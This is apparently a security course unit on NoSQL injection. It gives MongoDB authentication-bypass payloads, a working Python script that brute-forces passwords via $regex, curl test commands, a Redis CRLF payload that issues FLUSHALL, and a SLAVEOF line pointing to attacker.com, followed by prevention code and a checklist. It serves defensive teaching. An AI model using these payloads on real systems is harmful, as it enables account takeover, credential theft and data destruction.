# Unit 3: A03 - Injection — Topic 3: NoSQL Injection

## Overview

NoSQL databases (MongoDB, CouchDB, Redis, Cassandra) are increasingly targeted as applications move away from traditional SQL databases. While NoSQL databases don't use SQL, they are still vulnerable to injection attacks through **operator injection, JSON injection, and JavaScript injection**. NoSQL injection can bypass authentication, extract data, and in some cases achieve remote code execution. These attacks are particularly dangerous because many developers assume "no SQL = no injection."

---

## 1. NoSQL vs SQL Injection

```
┌─────────────────────────────────────────────────────────────────┐
│            SQL vs NoSQL INJECTION COMPARISON                    │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  SQL Injection:                                                │
│  Query: "SELECT * FROM users WHERE user='" + input + "'"       │
│  Attack: ' OR '1'='1                                           │
│  Mechanism: String concatenation into SQL syntax               │
│                                                                 │
│  NoSQL Injection (MongoDB):                                    │
│  Query: db.users.find({user: input, pass: input})              │
│  Attack: {"$ne": ""}  (operator injection)                     │
│  Mechanism: JSON object injection into query operators         │
│                                                                 │
│  Key difference:                                               │
│  SQL → manipulate string-based query language                  │
│  NoSQL → manipulate JSON/BSON query objects and operators      │
└─────────────────────────────────────────────────────────────────┘
```

---

## 2. MongoDB Operator Injection

### Authentication Bypass

```javascript
// VULNERABLE login endpoint
app.post('/login', async (req, res) => {
    const user = await db.collection('users').findOne({
        username: req.body.username,
        password: req.body.password
    });
    if (user) {
        res.json({ message: 'Login successful', token: generateToken(user) });
    } else {
        res.status(401).json({ message: 'Invalid credentials' });
    }
});

// Normal request:
// POST /login
// {"username": "admin", "password": "password123"}

// ATTACK — Operator injection:
// POST /login
// {"username": "admin", "password": {"$ne": ""}}
// → Finds user where username=admin AND password is NOT empty
// → Authentication bypassed!

// More attacks:
// {"username": {"$gt": ""}, "password": {"$gt": ""}}
// → Returns first user where both fields exist (often admin)

// {"username": {"$regex": "^admin"}, "password": {"$ne": ""}}
// → Regex matching for username
```

### Common MongoDB Operators Used in Injection

| Operator | Meaning | Attack Use |
|----------|---------|-----------|
| `$ne` | Not equal | Bypass equality checks |
| `$gt` | Greater than | Always-true conditions |
| `$gte` | Greater than or equal | Always-true conditions |
| `$lt` | Less than | Range-based extraction |
| `$regex` | Regular expression | Pattern-based extraction |
| `$in` | In array | Match multiple values |
| `$nin` | Not in array | Exclusion-based bypass |
| `$exists` | Field exists | Check field presence |
| `$where` | JavaScript expression | Code execution |
| `$or` | Logical OR | Bypass AND conditions |

---

## 3. Data Extraction Techniques

### Boolean-Based Extraction (Character by Character)

```python
import requests
import string

TARGET = "http://target.com/login"

def check(payload):
    """Send payload and check if login succeeds"""
    resp = requests.post(TARGET, json={
        "username": "admin",
        "password": payload
    })
    return "Login successful" in resp.text

# Extract password character by character using $regex
password = ""
charset = string.ascii_letters + string.digits + string.punctuation

for position in range(32):  # Max password length
    found = False
    for char in charset:
        # Escape regex special chars
        escaped = char.replace('\\', '\\\\').replace('.', '\\.')
        escaped = escaped.replace('*', '\\*').replace('+', '\\+')
        
        payload = {"$regex": f"^{password}{escaped}"}
        
        if check(payload):
            password += char
            print(f"[+] Found: {password}")
            found = True
            break
    
    if not found:
        break

print(f"\n[!] Password: {password}")
```

### Using $where for JavaScript Injection

```javascript
// VULNERABLE — $where accepts JavaScript
db.users.find({ $where: "this.username == '" + userInput + "'" });

// ATTACK — Inject JavaScript
// Input: ' || 1==1 || '
// Becomes: this.username == '' || 1==1 || ''
// → Returns all documents!

// Data exfiltration via timing
// Input: '; sleep(5000); var x='
// → If response is delayed, condition was evaluated

// More sophisticated JavaScript injection
// Input: '; return this.password.match(/^a/) ? true : false; var x='
// → Boolean-based extraction of password
```

---

## 4. URL Parameter Injection

When parameters are parsed into objects (e.g., Express.js with extended query parsing):

```
# Normal request
GET /search?username=admin

# Operator injection via URL
GET /search?username[$ne]=&password[$ne]=
# Express parses this as:
# { username: { "$ne": "" }, password: { "$ne": "" } }

# Regex injection via URL
GET /search?username[$regex]=^admin&password[$gt]=

# Array injection
GET /search?username[$in][]=admin&username[$in][]=root
```

### Testing with curl

```bash
# $ne operator injection
curl -X POST http://target.com/login \
    -H "Content-Type: application/json" \
    -d '{"username": "admin", "password": {"$ne": ""}}'

# $gt operator
curl -X POST http://target.com/login \
    -H "Content-Type: application/json" \
    -d '{"username": {"$gt": ""}, "password": {"$gt": ""}}'

# $regex for data extraction
curl -X POST http://target.com/login \
    -H "Content-Type: application/json" \
    -d '{"username": "admin", "password": {"$regex": "^p"}}'

# URL-based injection
curl "http://target.com/search?username[\$ne]=&password[\$ne]="
```

---

## 5. Other NoSQL Databases

### Redis Injection

```
# If application constructs Redis commands from user input
SET user:input_value "data"

# Attack: Inject CRLF to add new commands
Input: test\r\nFLUSHALL\r\n
→ SET user:test
  FLUSHALL           ← Deletes entire database!
  "data"

# Redis SSRF via protocol smuggling
Input: \r\nSLAVEOF attacker.com 6379\r\n
→ Turns Redis into a replica of attacker's server
```

### CouchDB Injection

```javascript
// CouchDB uses JavaScript for MapReduce views
// Injection in view parameters

// VULNERABLE — constructing view from user input
var designDoc = {
    views: {
        byUser: {
            map: "function(doc) { if(doc.user == '" + userInput + "') emit(doc._id, doc); }"
        }
    }
};

// ATTACK
// Input: ') emit(doc._id, doc); } //
// → All documents emitted
```

---

## 6. Prevention and Remediation

### Secure MongoDB Implementation

```javascript
// ✅ SECURE — Input type validation
app.post('/login', async (req, res) => {
    const { username, password } = req.body;
    
    // Type check — reject objects/arrays
    if (typeof username !== 'string' || typeof password !== 'string') {
        return res.status(400).json({ error: 'Invalid input type' });
    }
    
    // Sanitize — strip MongoDB operators
    const sanitizedUser = username.replace(/[$]/g, '');
    const sanitizedPass = password.replace(/[$]/g, '');
    
    const user = await db.collection('users').findOne({
        username: sanitizedUser,
        password: hashPassword(sanitizedPass)  // Hash passwords!
    });
    
    if (user) {
        res.json({ token: generateToken(user) });
    } else {
        res.status(401).json({ error: 'Invalid credentials' });
    }
});

// ✅ BETTER — Use mongoose with schema validation
const userSchema = new mongoose.Schema({
    username: { type: String, required: true },
    password: { type: String, required: true }
});

// Mongoose automatically rejects operator injection
// because schema enforces String type
```

### Express.js Hardening

```javascript
// Disable extended query parsing (prevents object injection in URL params)
app.use(express.urlencoded({ extended: false }));  // Use 'false' not 'true'

// Use express-mongo-sanitize middleware
const mongoSanitize = require('express-mongo-sanitize');
app.use(mongoSanitize());  // Removes $ and . from req.body/params/query
```

### Prevention Checklist

| Control | Description |
|---------|-------------|
| **Type validation** | Ensure inputs are strings, not objects |
| **Schema validation** | Use ODM (Mongoose) with strict schemas |
| **Input sanitization** | Strip `$` operators from input |
| **Parameterized queries** | Use ODM query builders |
| **Disable JS execution** | Disable `$where`, `mapReduce` if not needed |
| **Least privilege** | DB user with minimal permissions |
| **WAF rules** | Block common NoSQL injection patterns |
| **Extended parsing** | Disable `extended: true` in Express |

---

## Summary Table

| Attack | Target | Impact | Difficulty |
|--------|--------|--------|-----------|
| **Operator injection** | MongoDB queries | Auth bypass, data extraction | Easy |
| **$regex extraction** | MongoDB | Password/data extraction | Medium |
| **$where injection** | MongoDB JavaScript | Code execution | Medium |
| **URL parameter** | Express.js + MongoDB | Auth bypass | Easy |
| **Redis CRLF** | Redis commands | Data deletion, SSRF | Medium |
| **CouchDB JS** | MapReduce views | Data exfiltration | Hard |

---

## Revision Questions

1. How does NoSQL injection differ from SQL injection? What is the fundamental mechanism?
2. Demonstrate a MongoDB authentication bypass using `$ne` and `$gt` operators.
3. Write a Python script that extracts a password character-by-character using `$regex` injection.
4. What is `$where` injection in MongoDB? How can it lead to code execution?
5. How do URL parameters get converted to MongoDB operators in Express.js? How do you prevent this?
6. List six prevention measures for NoSQL injection and explain each.

---

*Previous: [02-sql-injection-deep-dive.md](02-sql-injection-deep-dive.md) | Next: [04-os-command-injection.md](04-os-command-injection.md)*

---

*[Back to README](../README.md)*
